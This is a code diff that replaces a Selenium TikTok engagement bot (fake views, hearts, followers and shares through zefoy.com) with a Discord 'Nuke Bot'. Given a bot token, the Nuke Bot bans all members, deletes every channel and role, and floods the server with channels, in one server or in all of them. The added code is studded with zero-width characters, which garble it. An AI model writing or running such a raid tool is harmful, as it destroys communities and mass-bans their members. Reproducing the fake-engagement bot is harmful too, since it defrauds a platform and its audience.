@@ -1,266 +1,148 @@
-from selenium import webdriver
-from os import system, name
-import chromedriver_binary
-from time import time, strftime, gmtime, sleep
-import pyfiglet, os, threading
-import chromedriver_autoinstaller
-
-# Check if the current version of chromedriver exists
-# and if it doesn't exist, download it automatically,
-# then add chromedriver to path
-chromedriver_autoinstaller.install()
-
-def clear():
-    if name == 'nt':
-        _ = system('cls')
-    else:
-        _ = system('clear')
-
-clear()
-system('title TIKTOD V3')
-
-print(pyfiglet.figlet_format("TIKTOD V3", font="slant"))
-print("1. Viewbot.\n2. Heartbot.\n3. Followerbot.\n3. Sharebot.\n4. Credits.\n")
-
-auto = int(input("Mode: "))
-
-if auto == 1 or auto == 2 or auto == 3 or auto == 4:
-    vidUrl = input("TikTok video URL: ")
-
-    start = time()
-    time_elapsed = strftime('%H:%M:%S', gmtime(time() - start))
-
-    chrome_options = webdriver.ChromeOptions()
-    chrome_options.add_argument("--mute-audio")
-    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
-
-    driver = webdriver.Chrome( options=chrome_options)
-    driver.set_window_size(1024, 650)
-
-    Views = 0
-    Hearts = 0
-    Followers = 0
-
-def beautify(arg):
-    return format(arg, ',d').replace(',', '.')
-
-def title1(): # Update the title IF option 1 was picked.
-    global Views
-    
-    while True:
-        time_elapsed = strftime('%H:%M:%S', gmtime(time() - start))
-        system(f'title TIKTOD V3 ^| Views Sent: {beautify(Views)} ^| Elapsed Time: {time_elapsed}')
-
-def title2(): # Update the title IF option 2 was picked.
-    global Hearts
-    
-    while True:
-        time_elapsed = strftime('%H:%M:%S', gmtime(time() - start))
-        system(f'title TIKTOD V3 ^| Hearts Sent: {beautify(Hearts)} ^| Elapsed Time: {time_elapsed}')
-
-def title3(): # Update the title IF option 3 was picked.
-    global Followers
-    
-    while True:
-        time_elapsed = strftime('%H:%M:%S', gmtime(time() - start))
-        system(f'title TIKTOD V3 ^| Followers Sent: {beautify(Followers)} ^| Elapsed Time: {time_elapsed}')
-        
-def title4(): # Update the title IF option 1 was picked.
-    global Shares
-    
-    while True:
-        time_elapsed = strftime('%H:%M:%S', gmtime(time() - start))
-        system(f'title TIKTOD V3 ^| Shares Sent: {beautify(Shares)} ^| Elapsed Time: {time_elapsed}')
-
-    
-def loop1():
-    global Views
-    sleep(10)
-    
-    try:
-        driver.find_element_by_xpath("/html/body/div[4]/div[1]/div[3]/div/div[4]/div/button").click()
-        
-    except:
-        print("[-] The captcha is unsolved!")
-        driver.refresh()
-        loop1()
-        
-    try:
-        sleep(2)
-        driver.find_element_by_xpath("//*[@id=\"sid4\"]/div/form/div/input").send_keys(vidUrl)
-        
-        sleep(1)
-        driver.find_element_by_xpath("//*[@id=\"sid4\"]/div/form/div/div/button").click()
-        
-        sleep(5)
-        driver.find_element_by_xpath("//*[@id=\"c2VuZC9mb2xsb3dlcnNfdGlrdG9V\"]/div[1]/div/form/button").click()
-        
-        driver.refresh()
-        Views += 1000
-        print("[+] Views sended!")
-        
-        sleep(300)
-        loop1()
-        
-    except:
-        print("[-] An error occured. Retrying..") 
-        driver.refresh()
-        loop1()
-
-def loop2():
-    global Hearts
-    sleep(10)
-    
-    try:
-        driver.find_element_by_xpath("/html/body/div[4]/div[1]/div[3]/div/div[2]/div/button").click()
-        
-    except:
-        print("[-] The captcha is unsolved!")
-        driver.refresh()
-        loop2()
-        
-    try:
-        sleep(2)
-        driver.find_element_by_xpath('//*[@id="sid2"]/div/form/div/input').send_keys(vidUrl)
-        
-        sleep(1)
-        driver.find_element_by_xpath('//*[@id="sid2"]/div/form/div/div/button').click()
-        
-        sleep(5)
-        driver.find_element_by_xpath('//*[@id="c2VuZE9nb2xsb3dlcnNfdGlrdG9r"]/div[1]/div/form/button').click()
-        
-        sleep(6)
-        hearts = driver.find_element_by_xpath('//*[@id="c2VuZE9nb2xsb3dlcnNfdGlrdG9r"]/span').text.split()
-        
-        Hearts += int(hearts[0])
-        print("[+] Hearts sended!")
-        
-        sleep(5)
-        driver.refresh()
-        
-        sleep(1800)
-        loop2()
-        
-    except:
-        print("[-] An error occured. Retrying..") 
-        driver.refresh()
-        loop2()
-
-def loop3():
-    global Followers
-    sleep(10)
-    
-    try:
-        driver.find_element_by_xpath("/html/body/div[4]/div[1]/div[3]/div/div[1]/div/button").click()
-        
-    except:
-        print("[-] The captcha is unsolved!")
-        driver.refresh()
-        loop3()
-        
-    try:
-        sleep(2)
-        driver.find_element_by_xpath("//*[@id=\"sid\"]/div/form/div/input").send_keys(vidUrl)
-        
-        sleep(1)
-        driver.find_element_by_xpath("//*[@id=\"sid\"]/div/form/div/div/button").click()
-        
-        sleep(5)
-        driver.find_element_by_xpath("//*[@id=\"c2VuZF9mb2xsb3dlcnNfdGlrdG9r\"]/div[1]/div/form/button").click()
-        sleep(6)
-        folls = driver.find_element_by_xpath('//*[@id="c2VuZF9mb2xsb3dlcnNfdGlrdG9r"]/span').text.split()
-        
-        Followers += int(folls[0])
-        print("[+] Followers sended!")
-        driver.refresh()
-        
-        sleep(1800)
-        loop3()
-        
-    except:
-        print("[-] An error occured. Retrying..")
-        driver.refresh()
-        loop3()
-
-def loop4():
-    global Shares
-    sleep(10)
-    
-    try:
-        driver.find_element_by_xpath("/html/body/div[4]/div[1]/div[3]/div/div[5]/div/button").click()
-        
-    except:
-        print("[-] The captcha is unsolved!")
-        driver.refresh()
-        loop4()
-        
-    try:
-        sleep(2)
-        driver.find_element_by_xpath("//*[@id=\"sid7\"]/div/form/div/input").send_keys(vidUrl)
-        
-        sleep(1)
-        driver.find_element_by_xpath("//*[@id=\"sid7\"]/div/form/div/div/button").click()
-        
-        sleep(5)
-        driver.find_element_by_xpath("//*[@id=\"c2VuZC9mb2xsb3dlcnNfdGlrdG9s\"]/div[1]/div/form/button").click()
-        
-        driver.refresh()
-        Shares += 100
-        print("[+] Shares sended!")
-        
-        sleep(300)
-        loop4()
-        
-    except:
-        print("[-] An error occured. Retrying..")
-        driver.refresh()
-        loop4()
-
-clear()
-
-print(pyfiglet.figlet_format("TIKTOD V3", font="slant"))
-print("Log:")
-
-if auto == 1:
-    driver.get("https://zefoy.com/")
-    
-    a = threading.Thread(target=title1)
-    b = threading.Thread(target=loop1)
-    
-    a.start()
-    b.start()
-    
-elif auto == 2:
-    driver.get("https://zefoy.com/")
-    
-    a = threading.Thread(target=title2)
-    b = threading.Thread(target=loop2)
-    
-    a.start()
-    b.start()
-    
-elif auto == 3:
-    driver.get("https://zefoy.com/")
-    
-    a = threading.Thread(target=title3)
-    b = threading.Thread(target=loop3)
-    
-    a.start()
-    b.start()
-    
-elif auto == 4:
-    driver.get("https://zefoy.com/")
-    
-    a = threading.Thread(target=title4)
-    b = threading.Thread(target=loop4)
-    
-    a.start()
-    b.start()
-    
-elif auto == 5:
-    print("[+] This program was created by @kangoka. [github.com/kangoka]")
-    print("[+] This program was origionally uploaded to github.com/kangoka/tiktodv3.")
-    print("[+] This program was majorly improved by @XxBi1a. [github.com/XxB1a]")
-    
-else:
-    
+ 
+ ​import​ ​discord 
+ ​from​ ​discord​.​ext​ ​import​ ​commands 
+ ​from​ ​colorama​ ​import​ ​init​, ​Fore​ ​as​ ​cc 
+ ​from​ ​os​ ​import​ ​name​ ​as​ ​os_name​, ​system 
+ ​from​ ​sys​ ​import​ ​exit 
+ ​init​() 
+ ​dr​ ​=​ ​DR​ ​=​ ​r​ ​=​ ​R​ ​=​ ​cc​.​LIGHTRED_EX 
+ ​g​ ​=​ ​G​ ​=​ ​cc​.​LIGHTGREEN_EX 
+ ​b​ ​=​ ​B​ ​=​ ​cc​.​LIGHTBLUE_EX 
+ ​m​ ​=​ ​M​ ​=​ ​cc​.​LIGHTMAGENTA_EX 
+ ​c​ ​=​ ​C​ ​=​ ​cc​.​LIGHTCYAN_EX 
+ ​y​ ​=​ ​Y​ ​=​ ​cc​.​LIGHTYELLOW_EX 
+ ​w​ ​=​ ​W​ ​=​ ​cc​.​RESET 
+  
+ ​clear​ ​=​ ​lambda​: ​system​(​'cls'​) ​if​ ​os_name​ ​==​ ​'nt'​ ​else​ ​system​(​'clear'​) 
+ ​def​ ​_input​(​text​):​print​(​text​, ​end​=​''​);​return​ ​input​() 
+  
+ ​baner​ ​=​ ​f''' 
+ ​{​r​}​ _   _       _       ​{​m​}​ ____        _    
+ ​{​r​}​| \ | |_   _| | _____​{​m​}​| __ )  ___ | |_  
+ ​{​r​}​|  \| | | | | |/ / _ ​{​m​}​\  _ \ / _ \| __| 
+ ​{​r​}​| |\  | |_| |   <  __​{​m​}​/ |_) | (_) | |_  
+ ​{​r​}​|_| \_|\__,_|_|\_\___​{​m​}​|____/ \___/ \__| 
+ ​{​y​}​Made by: ​{​g​}​https://github.com/Sigma-cc''' 
+  
+  
+  
+ ​async​ ​def​ ​delete_all_channel​(​guild​): 
+ ​    ​deleted​ ​=​ ​0 
+ ​    ​for​ ​channel​ ​in​ ​guild​.​channels​: 
+ ​        ​try​: 
+ ​            ​await​ ​channel​.​delete​() 
+ ​            ​deleted​ ​+=​ ​1 
+ ​        ​except​: 
+ ​            ​continue 
+ ​    ​return​ ​deleted 
+  
+ ​async​ ​def​ ​delete_all_roles​(​guild​): 
+ ​    ​deleted​ ​=​ ​0 
+ ​    ​for​ ​role​ ​in​ ​guild​.​roles​: 
+ ​        ​try​: 
+ ​            ​await​ ​role​.​delete​() 
+ ​            ​deleted​ ​+=​ ​1 
+ ​        ​except​: 
+ ​            ​continue 
+ ​    ​return​ ​deleted 
+  
+ ​async​ ​def​ ​ban_all_members​(​guild​): 
+ ​    ​banned​ ​=​ ​0 
+ ​    ​for​ ​member​ ​in​ ​guild​.​members​: 
+ ​        ​try​: 
+ ​            ​await​ ​member​.​ban​() 
+ ​            ​banned​ ​+=​ ​1 
+ ​        ​except​: 
+ ​            ​continue 
+ ​    ​return​ ​banned 
+  
+  
+ ​async​ ​def​ ​create_roles​(​guild​, ​name​): 
+ ​    ​created​ ​=​ ​0 
+ ​    ​for​ ​_​ ​in​ ​range​(​200​ ​-​ ​len​(​guild​.​roles​)): 
+ ​        ​try​: 
+ ​            ​await​ ​guild​.​create_role​(​name​=​name​) 
+ ​            ​created​ ​+=​ ​1 
+ ​        ​except​: 
+ ​            ​continue 
+ ​    ​return​ ​created 
+  
+ ​async​ ​def​ ​create_voice_channels​(​guild​, ​name​): 
+ ​    ​created​ ​=​ ​0 
+ ​    ​for​ ​_​ ​in​ ​range​(​200​ ​-​ ​len​(​guild​.​channels​)): 
+ ​        ​try​: 
+ ​            ​await​ ​guild​.​create_voice_channel​(​name​=​name​) 
+ ​            ​created​ ​+=​ ​1 
+ ​        ​except​: 
+ ​            ​continue 
+ ​    ​return​ ​created 
+  
+ ​async​ ​def​ ​nuke_guild​(​guild​): 
+ ​    ​print​(​f'​{​r​}​Nuke: ​{​m​}​{​guild​.​name​}​'​) 
+ ​    ​banned​ ​=​ ​await​ ​ban_all_members​(​guild​) 
+ ​    ​print​(​f'​{​m​}​Banned:​{​b​}​{​banned​}​'​) 
+ ​    ​deleted_channels​ ​=​ ​await​ ​delete_all_channel​(​guild​) 
+ ​    ​print​(​f'​{​m​}​Delete Channels:​{​b​}​{​deleted_channels​}​'​) 
+ ​    ​delete_roles​ ​=​ ​await​ ​delete_all_roles​(​guild​) 
+ ​    ​print​(​f'​{​m​}​Delete Roles:​{​b​}​{​delete_roles​}​'​) 
+ ​    ​created_channels​ ​=​ ​await​ ​create_voice_channels​(​guild​,​name​) 
+ ​    ​print​(​f'​{​m​}​Create Voice Channels:​{​b​}​{​created_channels​}​'​) 
+ ​    ​#created_roles = await created_roles(guild,name) 
+ ​    ​#print(f'{m}Create Roles:{b}{created_roles}') 
+ ​    ​print​(​f'​{​r​}​--------------------------------------------​\n​\n​'​) 
+  
+  
+ ​while​ ​True​: 
+ ​    ​clear​() 
+ ​    ​choice​ ​=​ ​input​(​f'''    
+ ​{​baner​}​                 
+ ​{​c​}​-------------------------------------------- 
+ ​{​b​}​[Menu] 
+ ​    ​{​y​}​└─[1] ​{​m​}​- ​{​g​}​Run Setup Nuke Bot 
+ ​    ​{​y​}​└─[2] ​{​m​}​- ​{​g​}​Exit 
+ ​{​y​}​====>​{​g​}​'''​) 
+ ​    ​if​ ​choice​ ​==​ ​'1'​: 
+ ​        ​token​ ​=​ ​_input​(​f'​{​y​}​Input bot token:​{​g​}​'​) 
+ ​        ​name​ ​=​ ​_input​(​f'​{​y​}​Input name for created channels / roles:​{​g​}​'​) 
+ ​        ​clear​() 
+ ​        ​choice_type​ ​=​ ​_input​(​f''' 
+ ​{​baner​}​                 
+ ​{​c​}​-------------------------------------------- 
+ ​{​b​}​[Select] 
+ ​    ​{​y​}​└─[1] ​{​m​}​- ​{​g​}​Nuke of all servers. 
+ ​    ​{​y​}​└─[2] ​{​m​}​- ​{​g​}​Nuke only one server.   
+ ​    ​{​y​}​└─[3] ​{​m​}​- ​{​g​}​Exit 
+ ​{​y​}​====>​{​g​}​'''​) 
+ ​        ​client​ ​=​ ​commands​.​Bot​(​command_prefix​=​'.'​,​intents​=​discord​.​Intents​.​all​()) 
+ ​        ​if​ ​choice_type​ ​==​ ​'1'​: 
+ ​            ​@​client​.​event 
+ ​            ​async​ ​def​ ​on_ready​(): 
+ ​                ​print​(​f''' 
+ ​[+]Logged as ​{​client​.​user​.​name​} 
+ ​[+]Bot in ​{​len​(​client​.​guilds​)​}​ servers!'''​) 
+ ​                ​for​ ​guild​ ​in​ ​client​.​guilds​: 
+ ​                    ​await​ ​nuke_guild​(​guild​) 
+ ​                ​await​ ​client​.​close​() 
+ ​        ​elif​ ​choice_type​ ​==​ ​'2'​: 
+ ​            ​guild_id​ ​=​  ​_input​(​f'​{​y​}​Input server id:​{​g​}​'​) 
+ ​            ​@​client​.​event 
+ ​            ​async​ ​def​ ​on_ready​(): 
+ ​                ​for​ ​guild​ ​in​ ​client​.​guilds​: 
+ ​                    ​if​ ​str​(​guild​.​id​) ​==​ ​guild_id​: 
+ ​                        ​await​ ​nuke_guild​(​guild​) 
+ ​                ​await​ ​client​.​close​() 
+ ​        ​elif​ ​choice_type​ ​==​ ​'3'​: 
+ ​            ​print​(​f'​{​dr​}​Exit...'​) 
+ ​            ​exit​() 
+ ​        ​try​: 
+ ​            ​client​.​run​(​token​) 
+ ​            ​input​(​'Nuke finished, press enter for return to menu...'​) 
+ ​        ​except​ ​Exception​ ​as​ ​error​: 
+ ​            ​if​ ​error​ ​==​ ​'''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.'''​: 
+ ​                ​input​(​f'​{​r​}​Intents Error​\n​{​g​}​For fix -> https://prnt.sc/wmrwut​\n​{​b​}​Press enter for return...'​) 
+ ​            ​else​: 
+ ​                ​input​(​f'​{​r​}​{​error​}​\n​{​b​}​Press enter for return...'​) 
+ ​            ​continue 
+ ​    ​elif​ ​choice​ ​==​ ​'2'​: 
+ ​        ​print​(​f'​{​dr​}​Exit...'​) 
+ ​        ​exit​()
